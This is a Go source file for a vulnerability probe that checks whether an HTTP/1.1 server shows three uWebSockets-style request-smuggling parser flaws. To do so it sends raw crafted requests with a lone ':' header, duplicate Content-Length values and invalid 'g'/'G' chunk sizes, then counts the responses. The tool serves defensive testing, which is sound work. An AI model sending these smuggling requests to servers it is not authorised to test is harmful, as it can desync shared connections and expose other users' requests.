// smuggle_probe.go — single-file HTTP request-smuggling parser-deviation probe.
//
// Given a URL, it checks whether the target's HTTP/1.1 parser exhibits the three
// deviations behind the uWebSockets request-smuggling class:
//
//	A  empty header name (a lone ":") hides a following Content-Length
//	B  duplicate Content-Length accepted, FIRST value used (RFC 9112 §6.3 says reject)
//	C  chunk-size hex parser accepts 'g'/'G'/'@' as digit 16 (a compliant parser rejects)
//
// It speaks RAW HTTP/1.1 over a socket (deliberately NOT net/http, which would
// normalize away the very bytes we need to send).
//
//   - For A and B it opens ONE keep-alive connection, sends a request that a
//     *safe* server frames as a single request, and counts how many HTTP
//     responses come back. If an extra ("smuggled") response appears, the
//     request boundary desynced — the deviation is present.
//   - For C it sends a differential set of chunk sizes (valid "10", the suspect
//     "g"/"G", and always-invalid "z") on fresh connections and compares which
//     are accepted vs rejected.
//
// IMPORTANT — what a positive result means:
//
//	A positive result shows the BACK-END PARSER is deviating, which is the
//	necessary condition for smuggling. Turning it into cross-user data theft
//	ALSO requires a front-end that (a) pools/reuses back-end connections across
//	clients AND (b) forwards these malformed requests without normalizing
//	(an L4/TCP load balancer, or a lenient gateway). A compliant L7 proxy
//	(nginx, envoy) rejects/normalizes all three and closes the hole. So point
//	this probe at BOTH your back-end directly AND at your proxy's front door —
//	the difference is the whole story.
//
// Usage:
//
//	go run smuggle_probe.go [-k] [-timeout 4s] [-v] <url>
//	go run smuggle_probe.go http://127.0.0.1:9001/
//	go run smuggle_probe.go -k https://127.0.0.1:8443/api
//
// Exit code: 0 if no deviation is detected on any case, 1 if any case is
// VULNERABLE, 2 on usage/connection error (handy for scripting).
package main

import (
	"bytes"
	"crypto/tls"
	"flag"
	"fmt"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

var (
	insecure = flag.Bool("k", false, "skip TLS certificate verification (for local self-signed servers)")
	verbose  = flag.Bool("v", false, "verbose: dump raw requests and responses")
	overall  = flag.Duration("timeout", 4*time.Second, "overall read budget per probe")
)

const idle = 600 * time.Millisecond // stop reading a response burst after this much silence

func main() {
	flag.Parse()
	if flag.NArg() != 1 {
		fmt.Fprintln(os.Stderr, "usage: smuggle_probe [-k] [-timeout 4s] [-v] <url>")
		os.Exit(2)
	}
	t, err := url.Parse(flag.Arg(0))
	if err != nil || (t.Scheme != "http" && t.Scheme != "https") {
		fmt.Fprintf(os.Stderr, "invalid URL (need http:// or https://): %v\n", err)
		os.Exit(2)
	}
	host := t.Host
	path := t.EscapedPath()
	if path == "" {
		path = "/"
	}
	if t.RawQuery != "" {
		path += "?" + t.RawQuery
	}

	fmt.Printf("uWebSockets request-smuggling parser-deviation probe\n")
	fmt.Printf("target: %s   (authority %s, path %s, tls=%v)\n\n", t.String(), host, path, t.Scheme == "https")

	// Baseline: reachability + does the server keep the connection alive / pipeline?
	base := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", path, host)
	bResp, err := roundTrip(t, host, []byte(base+base)) // two pipelined GETs
	if err != nil {
		fmt.Fprintf(os.Stderr, "[baseline] cannot reach target: %v\n", err)
		os.Exit(2)
	}
	pipelines := countResponses(bResp) >= 2
	fmt.Printf("[baseline] reachable: %q ; keep-alive/pipelining: %v\n", firstLine(bResp), yn(pipelines))
	if s, u := respHeader(bResp, "server"), respHeader(bResp, "uwebsockets"); s != "" || u != "" {
		fmt.Printf("[identity] Server=%q uWebSockets=%q  (a 'Server: nginx/cloudflare/…' banner ⇒ a proxy/CDN answers; a 'uWebSockets' header ⇒ uWS itself)\n", s, u)
	}
	if !pipelines {
		fmt.Printf("           (server closes per request — A/B use connection reuse, so results there are best-effort)\n")
	}
	fmt.Println()

	a := caseA(t, host, path)
	b := caseB(t, host, path)
	c := caseC(t, host, path)

	fmt.Printf("\nSUMMARY:  A=%s   B=%s   C=%s\n", a.verdict, b.verdict, c.verdict)
	fmt.Printf("NOTE: these detect BACK-END parser deviations (the necessary condition). Cross-user\n")
	fmt.Printf("      theft additionally needs a pooling + non-normalizing front-end (L4 LB / lenient\n")
	fmt.Printf("      gateway). A compliant L7 proxy (nginx/envoy) rejects all three — probe your\n")
	fmt.Printf("      proxy's front door too, and compare.\n")

	if a.vuln || b.vuln || c.vuln {
		os.Exit(1)
	}
}

type result struct {
	verdict string
	vuln    bool
}

func report(tag, title string, verdict string, vuln bool, evidence string) result {
	dots := strings.Repeat(".", max(3, 46-len(title)))
	fmt.Printf("[%s] %s %s %s\n", tag, title, dots, verdict)
	if evidence != "" {
		fmt.Printf("     evidence: %s\n", evidence)
	}
	return result{verdict, vuln}
}

// A — empty header name hides Content-Length.
func caseA(t *url.URL, host, path string) result {
	embedded := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", path, host)
	crafted := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\n:\r\nContent-Length: %d\r\nConnection: keep-alive\r\n\r\n%s",
		path, host, len(embedded), embedded)
	canary := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", path, host)
	data, err := roundTrip(t, host, []byte(crafted+canary))
	if err != nil {
		return report("A", "empty header name hides Content-Length", "ERROR("+err.Error()+")", false, "")
	}
	n := countResponses(data)
	ev := fmt.Sprintf("crafted single-request framing returned %d responses (first: %q)", n, firstLine(data))
	switch {
	case n >= 3:
		return report("A", "empty header name hides Content-Length", "VULNERABLE", true,
			ev+" — the ':' line hid Content-Length, so the trailing request was parsed separately")
	case n == 2:
		return report("A", "empty header name hides Content-Length", "safe", false,
			ev+" — Content-Length was honored (trailing bytes absorbed as body)")
	default:
		return report("A", "empty header name hides Content-Length", "safe/rejected", false,
			ev+" — request rejected or connection closed (likely 400 on the empty header name)")
	}
}

// B — duplicate Content-Length, first value wins.
func caseB(t *url.URL, host, path string) result {
	embedded := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", path, host)
	crafted := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: 0\r\nContent-Length: %d\r\nConnection: keep-alive\r\n\r\n%s",
		path, host, len(embedded), embedded)
	canary := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", path, host)
	data, err := roundTrip(t, host, []byte(crafted+canary))
	if err != nil {
		return report("B", "duplicate Content-Length, first wins", "ERROR("+err.Error()+")", false, "")
	}
	n := countResponses(data)
	ev := fmt.Sprintf("duplicate CL (0 then %d) returned %d responses (first: %q)", len(embedded), n, firstLine(data))
	switch {
	case n >= 3:
		return report("B", "duplicate Content-Length, first wins", "VULNERABLE", true,
			ev+" — server used the FIRST Content-Length (0) and smuggled the trailing request (uWS behavior)")
	case n == 2:
		return report("B", "duplicate Content-Length, first wins", "accepts-dup(last-wins)", false,
			ev+" — accepts duplicate CL but used the LAST value (RFC-violating, but not uWS's first-wins)")
	default:
		return report("B", "duplicate Content-Length, first wins", "safe/rejected", false,
			ev+" — request rejected or connection closed (likely 400 on duplicate Content-Length)")
	}
}

// C — chunk-size hex parser accepts 'g'/'G' as digit 16.
func caseC(t *url.URL, host, path string) result {
	body := "0123456789abcdef" // exactly 16 bytes
	probe := func(size string) int {
		req := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n%s\r\n%s\r\n0\r\n\r\n",
			path, host, size, body)
		data, err := roundTrip(t, host, []byte(req))
		if err != nil {
			return -1
		}
		return statusOf(data)
	}
	valid, g, G, z := probe("10"), probe("g"), probe("G"), probe("z")
	ev := fmt.Sprintf("'10'->%s, 'g'->%s, 'G'->%s, 'z'->%s", sc(valid), sc(g), sc(G), sc(z))
	// A chunk-size PARSE rejection is a 400. Any other real status (200, 404, 405, …) means the
	// chunk framing was accepted and the request reached routing. Compare 'g'/'G' to the valid '10'
	// control (routed) vs the invalid 'z' control (400) — this works even when the probed path
	// returns 404, where a naive "is it 2xx?" check would be inconclusive.
	routed := func(s int) bool { return s >= 200 && s < 600 && s != 400 }
	switch {
	case !routed(valid):
		return report("C", "chunk-size accepts 'g'/'G' as 16 (F1)", "inconclusive", false,
			ev+" — valid chunked ('10') was not parsed/routed (got 400/none); can't test chunked here")
	case z != 400:
		return report("C", "chunk-size accepts 'g'/'G' as 16 (F1)", "inconclusive", false,
			ev+" — control 'z' was not rejected with 400; server does not validate chunk sizes (can't isolate 'g')")
	case routed(g) || routed(G):
		return report("C", "chunk-size accepts 'g'/'G' as 16 (F1)", "VULNERABLE", true,
			ev+" — 'g'/'G' parsed/routed like the valid '10' while 'z' is rejected(400): the off-by-one is live")
	default:
		return report("C", "chunk-size accepts 'g'/'G' as 16 (F1)", "safe/hardened", false,
			ev+" — 'g'/'G' rejected(400) like 'z' while '10' routed: the chunk-size parser is strict")
	}
}

// --- raw socket plumbing ---

func roundTrip(t *url.URL, host string, payload []byte) ([]byte, error) {
	conn, err := dial(t, host)
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	if *verbose {
		fmt.Printf("\n--- SEND ---\n%s\n", string(payload))
	}
	conn.SetWriteDeadline(time.Now().Add(*overall))
	if _, err := conn.Write(payload); err != nil {
		return nil, err
	}
	deadline := time.Now().Add(*overall)
	var buf []byte
	tmp := make([]byte, 1<<16)
	for time.Now().Before(deadline) {
		conn.SetReadDeadline(time.Now().Add(idle))
		n, err := conn.Read(tmp)
		if n > 0 {
			buf = append(buf, tmp[:n]...)
		}
		if err != nil {
			break // idle timeout (burst done) or EOF (connection closed)
		}
	}
	if *verbose {
		fmt.Printf("--- RECV (%d bytes, %d responses) ---\n%s\n", len(buf), countResponses(buf), string(buf))
	}
	return buf, nil
}

func dial(t *url.URL, host string) (net.Conn, error) {
	hostname := t.Hostname()
	port := t.Port()
	if port == "" {
		if t.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}
	raw, err := net.DialTimeout("tcp", net.JoinHostPort(hostname, port), 5*time.Second)
	if err != nil {
		return nil, err
	}
	if t.Scheme == "https" {
		tc := tls.Client(raw, &tls.Config{ServerName: hostname, InsecureSkipVerify: *insecure})
		tc.SetDeadline(time.Now().Add(5 * time.Second))
		if err := tc.Handshake(); err != nil {
			raw.Close()
			return nil, fmt.Errorf("tls handshake: %w", err)
		}
		tc.SetDeadline(time.Time{})
		return tc, nil
	}
	return raw, nil
}

// countResponses walks the byte stream response-by-response (by Content-Length
// or chunked framing) rather than splitting on CRLF — a response body can end in
// "\n" and glue onto the next status line, so naive line-counting under-counts.
func countResponses(data []byte) int {
	s := data
	n := 0
	for len(s) > 0 {
		if !bytes.HasPrefix(s, []byte("HTTP/1.")) {
			break
		}
		he := bytes.Index(s, []byte("\r\n\r\n"))
		if he < 0 {
			n++ // partial/truncated headers — count it and stop
			break
		}
		head := strings.ToLower(string(s[:he]))
		bodyStart := he + 4
		n++
		if cl := headerValue(head, "content-length"); cl != "" {
			end := bodyStart + atoiSafe(cl)
			if end >= len(s) {
				break // body runs past what we captured
			}
			s = s[end:]
			continue
		}
		if strings.Contains(head, "transfer-encoding:") && strings.Contains(head, "chunked") {
			if term := bytes.Index(s[bodyStart:], []byte("0\r\n\r\n")); term >= 0 {
				s = s[bodyStart+term+5:]
				continue
			}
			break
		}
		break // no Content-Length and not chunked: body runs to EOF
	}
	return n
}

// headerValue returns the value of the named header from a lowercased header
// block, or "" if absent.
func headerValue(lowerHead, name string) string {
	for _, line := range strings.Split(lowerHead, "\r\n") {
		if strings.HasPrefix(line, name+":") {
			return strings.TrimSpace(line[len(name)+1:])
		}
	}
	return ""
}

func atoiSafe(s string) int {
	n, err := strconv.Atoi(strings.TrimSpace(s))
	if err != nil || n < 0 {
		return 0
	}
	return n
}

// respHeader returns the value of the named header from the FIRST response block.
func respHeader(data []byte, lowerName string) string {
	he := bytes.Index(data, []byte("\r\n\r\n"))
	if he < 0 {
		he = len(data)
	}
	return headerValue(strings.ToLower(string(data[:he])), lowerName)
}

func firstLine(data []byte) string {
	if i := strings.Index(string(data), "\r\n"); i >= 0 {
		return string(data[:i])
	}
	if len(data) == 0 {
		return "<no response>"
	}
	return string(data)
}

// statusOf returns the numeric status of the FIRST response, or -1.
func statusOf(data []byte) int {
	fl := firstLine(data)
	f := strings.Fields(fl)
	if len(f) < 2 || !strings.HasPrefix(f[0], "HTTP/1.") {
		return -1
	}
	code := 0
	for _, r := range f[1] {
		if r < '0' || r > '9' {
			return -1
		}
		code = code*10 + int(r-'0')
	}
	return code
}

func sc(code int) string {
	if code < 0 {
		return "no-resp"
	}
	return fmt.Sprintf("%d", code)
}
func yn(b bool) string {
	if b {
		return "YES"
	}
	return "no"
}
func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}
